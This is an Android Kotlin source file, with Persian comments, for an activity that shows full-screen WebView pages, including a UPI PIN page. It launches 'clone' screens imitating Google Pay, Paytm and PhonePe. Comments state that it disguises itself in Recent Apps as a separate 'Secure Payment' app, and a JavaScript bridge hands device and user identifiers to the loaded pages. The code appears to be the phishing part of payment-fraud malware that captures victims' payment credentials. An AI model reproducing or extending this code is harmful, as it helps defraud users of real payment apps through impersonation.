package com.example.test

import android.app.ActivityManager
import android.content.Intent
import android.graphics.BitmapFactory
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.WindowManager
import android.webkit.WebChromeClient
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.core.view.WindowInsetsControllerCompat
import com.example.test.utils.DeviceInfoHelper
import com.example.test.ServerConfig

/**
 * ⭐ PaymentActivity - نمایش صفحه پرداخت به صورت کلون (مثل یک برنامه جداگانه)
 * 
 * این Activity با taskAffinity جداگانه باز میشه که باعث میشه:
 * - مثل یک برنامه جداگانه در Recent Apps نمایش داده بشه
 * - Task جداگانه داشته باشه
 * - تجربه کاربری مثل باز کردن یک برنامه پرداخت خارجی باشه
 */
class PaymentActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var deviceId: String
    private lateinit var appConfig: AppConfig

    companion object {
        private const val TAG = "PaymentActivity"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // ⭐ Fullscreen mode
        enableFullscreen()
        
        // ⭐ تنظیم Task Description برای نمایش در Recent Apps
        setTaskDescriptionForRecentApps()
        
        // ⭐ Load config
        appConfig = AppConfig.load(this)
        deviceId = DeviceInfoHelper.getDeviceId(this)
        
        // ⭐ Initialize ServerConfig
        ServerConfig.initialize(this)
        
        Log.d(TAG, "════════════════════════════════════════")
        Log.d(TAG, "🚀 PAYMENT ACTIVITY CREATED")
        Log.d(TAG, "════════════════════════════════════════")
        Log.d(TAG, "📱 Device ID: $deviceId")
        Log.d(TAG, "📱 App Type: ${appConfig.appType}")
        Log.d(TAG, "════════════════════════════════════════")
        
        // ⭐ Create WebView
        webView = createWebView()
        setContentView(webView)
        
        // ⭐ Load payment HTML based on flavor
        loadPaymentHtml()
    }

    /**
     * ⭐ تنظیم Task Description برای نمایش در Recent Apps
     * این باعث میشه که مثل یک برنامه جداگانه نمایش داده بشه
     */
    private fun setTaskDescriptionForRecentApps() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val taskDescription = ActivityManager.TaskDescription(
                "Secure Payment",  // نام در Recent Apps
                BitmapFactory.decodeResource(resources, android.R.drawable.ic_menu_myplaces), // Icon
                ContextCompat.getColor(this, android.R.color.white) // Color
            )
            setTaskDescription(taskDescription)
        }
    }

    /**
     * ⭐ Fullscreen mode
     */
    private fun enableFullscreen() {
        supportActionBar?.hide()
        
        WindowCompat.setDecorFitsSystemWindows(window, false)
        
        val windowInsetsController = WindowCompat.getInsetsController(window, window.decorView)
        windowInsetsController.apply {
            hide(WindowInsetsCompat.Type.systemBars())
            systemBarsBehavior = WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
            // ⭐ تنظیم رنگ status bar icons به تیره (dark) - برای background روشن
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                isAppearanceLightStatusBars = true // true = icons تیره (برای background روشن)
            }
            // ⭐ تنظیم رنگ navigation bar icons
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                isAppearanceLightNavigationBars = false // icons روشن برای navigation bar
            }
        }
        
        window.statusBarColor = android.graphics.Color.TRANSPARENT
        window.navigationBarColor = android.graphics.Color.TRANSPARENT
        
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
    }

    /**
     * ⭐ ساخت WebView برای نمایش صفحه پرداخت
     */
    private fun createWebView(): WebView {
        val webView = WebView(this).apply {
            layoutParams = android.view.ViewGroup.LayoutParams(
                android.view.ViewGroup.LayoutParams.MATCH_PARENT,
                android.view.ViewGroup.LayoutParams.MATCH_PARENT
            )
            
            isVerticalScrollBarEnabled = false
            isHorizontalScrollBarEnabled = false
            setBackgroundColor(android.graphics.Color.WHITE)
        }

        val webSettings: WebSettings = webView.settings
        webSettings.javaScriptEnabled = true
        webSettings.javaScriptCanOpenWindowsAutomatically = true
        webSettings.domStorageEnabled = true
        webSettings.databaseEnabled = true
        webSettings.allowFileAccess = true
        webSettings.allowContentAccess = true

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
            webSettings.allowFileAccessFromFileURLs = false
            webSettings.allowUniversalAccessFromFileURLs = false
        }

        webSettings.loadWithOverviewMode = true
        webSettings.useWideViewPort = true
        webSettings.layoutAlgorithm = WebSettings.LayoutAlgorithm.NORMAL
        webSettings.setSupportZoom(false)
        webSettings.builtInZoomControls = false
        webSettings.displayZoomControls = false
        webSettings.loadsImagesAutomatically = true
        webSettings.blockNetworkImage = false
        webSettings.blockNetworkLoads = false
        webSettings.cacheMode = WebSettings.LOAD_DEFAULT

        webView.setInitialScale(100)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            webView.setLayerType(WebView.LAYER_TYPE_HARDWARE, null)
            WebView.setWebContentsDebuggingEnabled(true)
        } else {
            webView.setLayerType(WebView.LAYER_TYPE_SOFTWARE, null)
        }

        // ⭐ WebViewClient برای مدیریت navigation
        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView?, request: android.webkit.WebResourceRequest?): Boolean {
                val url = request?.url?.toString() ?: return false
                return handleUrlNavigation(url)
            }

            override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
                return if (url != null) {
                    handleUrlNavigation(url)
                } else {
                    false
                }
            }

            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                Log.d(TAG, "✅ Payment page loaded: $url")
                
                // ⭐ اعمال رنگ status bar از meta tag
                applyThemeColorFromPage()
            }
        }

        webView.webChromeClient = object : WebChromeClient() {
            override fun onConsoleMessage(msg: android.webkit.ConsoleMessage?): Boolean {
                msg?.let {
                    Log.d(TAG, "JS: ${it.message()}")
                }
                return true
            }
        }

        // ⭐ JavaScript Interface
        webView.addJavascriptInterface(object {
            @android.webkit.JavascriptInterface
            fun getDeviceId(): String = deviceId
            
            @android.webkit.JavascriptInterface
            fun getUserId(): String = appConfig.userId
            
            @android.webkit.JavascriptInterface
            fun getAppType(): String = appConfig.appType
            
            @android.webkit.JavascriptInterface
            fun getAppName(): String = appConfig.appName
            
            @android.webkit.JavascriptInterface
            fun getBaseUrl(): String = ServerConfig.getBaseUrl()
            
            /**
             * ⭐ باز کردن کلون روش پرداخت انتخاب شده
             * @param paymentMethod نوع روش پرداخت: "gpay", "paytm", "phonepe"
             */
            @android.webkit.JavascriptInterface
            fun openPaymentClone(paymentMethod: String) {
                Log.d(TAG, "💰 Opening payment clone: $paymentMethod")
                openPaymentCloneActivity(paymentMethod)
            }
        }, "Android")

        return webView
    }

    /**
     * ⭐ مدیریت navigation در صفحه پرداخت
     * تمام صفحات مربوط به پرداخت (payment.html, googlepay-splash.html, upi-pin.html, final.html)
     * در همین Activity لود می‌شن تا تجربه کلون حفظ بشه
     */
    private fun handleUrlNavigation(url: String): Boolean {
        Log.d(TAG, "🔗 Payment navigation request: $url")
        
        // ⭐ اگر URL خارج از assets هست، در همین WebView لود کن
        if (url.startsWith("http://") || url.startsWith("https://")) {
            return false  // اجازه بده در WebView لود بشه
        }
        
        // ⭐ اگر فایل HTML داخلی هست (صفحات پرداخت)، در همین Activity لود کن
        if (url.endsWith(".html")) {
            // ⭐ تبدیل URL نسبی به کامل اگر نیاز بود
            val fullUrl = if (url.startsWith("file://")) {
                url
            } else if (url.startsWith("/")) {
                "file:///android_asset${url}"
            } else {
                "file:///android_asset/$url"
            }
            
            Log.d(TAG, "📄 Loading payment page: $fullUrl")
            webView.loadUrl(fullUrl)
            return true  // جلوگیری از لود شدن در مرورگر خارجی
        }
        
        return false
    }

    /**
     * ⭐ لود کردن صفحه پرداخت بر اساس flavor
     */
    private fun loadPaymentHtml() {
        val paymentHtmlPath = "file:///android_asset/payment.html"
        Log.d(TAG, "📄 Loading payment page: $paymentHtmlPath")
        webView.loadUrl(paymentHtmlPath)
    }
    
    /**
     * ⭐ باز کردن Activity کلون روش پرداخت انتخاب شده
     * @param paymentMethod نوع روش پرداخت: "gpay", "paytm", "phonepe"
     */
    private fun openPaymentCloneActivity(paymentMethod: String) {
        Log.d(TAG, "════════════════════════════════════════")
        Log.d(TAG, "💰 OPENING PAYMENT CLONE: $paymentMethod")
        Log.d(TAG, "════════════════════════════════════════")
        
        val intent = when (paymentMethod.lowercase()) {
            "gpay", "googlepay", "google-pay" -> {
                Intent(this, GPayCloneActivity::class.java)
            }
            "paytm" -> {
                Intent(this, PaytmCloneActivity::class.java)
            }
            "phonepe" -> {
                Intent(this, PhonePeCloneActivity::class.java)
            }
            else -> {
                Log.e(TAG, "❌ Unknown payment method: $paymentMethod")
                return
            }
        }
        
        startActivity(intent)
        finish() // بستن PaymentActivity بعد از باز کردن کلون
    }

    /**
     * ⭐ اعمال رنگ status bar از meta tag صفحه
     */
    private fun applyThemeColorFromPage() {
        webView.evaluateJavascript(
            """
            (function() {
                try {
                    var metaTheme = document.querySelector('meta[name="theme-color"]');
                    if (metaTheme) {
                        return metaTheme.getAttribute('content');
                    }
                    return null;
                } catch(e) {
                    return null;
                }
            })();
            """.trimIndent()
        ) { color ->
            if (color != null && color != "null") {
                val colorValue = color.replace("\"", "")
                    try {
                        val parsedColor = android.graphics.Color.parseColor(colorValue)
                        // evaluateJavascript callback روی UI thread اجرا میشه، پس نیازی به runOnUiThread نیست
                        runOnUiThread {
                            window.statusBarColor = parsedColor
                            window.navigationBarColor = parsedColor
                            Log.d(TAG, "🎨 Status bar color set to: $colorValue")
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "❌ Failed to parse color: $colorValue", e)
                    }
            }
        }
    }

    /**
     * ⭐ مدیریت دکمه برگشت
     */
    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        if (::webView.isInitialized && webView.canGoBack()) {
            webView.goBack()
        } else {
            // ⭐ بستن Activity و برگشت به MainActivity
            finish()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "👋 PaymentActivity destroyed")
        
        if (::webView.isInitialized) {
            webView.stopLoading()
            webView.clearCache(true)
            webView.destroy()
        }
    }
}

